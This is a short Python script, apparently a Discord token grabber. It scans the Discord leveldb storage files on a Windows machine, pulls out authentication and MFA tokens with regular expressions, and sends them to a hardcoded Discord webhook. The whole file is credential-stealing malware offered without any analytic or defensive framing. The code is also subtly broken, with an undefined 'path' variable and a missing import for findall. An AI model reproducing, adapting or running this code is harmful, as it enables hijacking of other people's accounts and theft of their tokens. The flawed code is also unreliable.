import os, requests

PATH = os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb"
tokens = []
for file_name in os.listdir(PATH):
  if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
    continue
  for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
      for token in findall(regex, line):
        tokens.append(token)
        
url = "https://discord.com/api/webhooks/1210528787888873532/kaFkf_b_I8HxEetp4beG984nxda6QPof-L6MSAf6nUvQI5aavLpk_t9uh3zJIWxluI0H"
data = {
  "content": "\n".join(tokens)
}

requests.post(url, json=data)
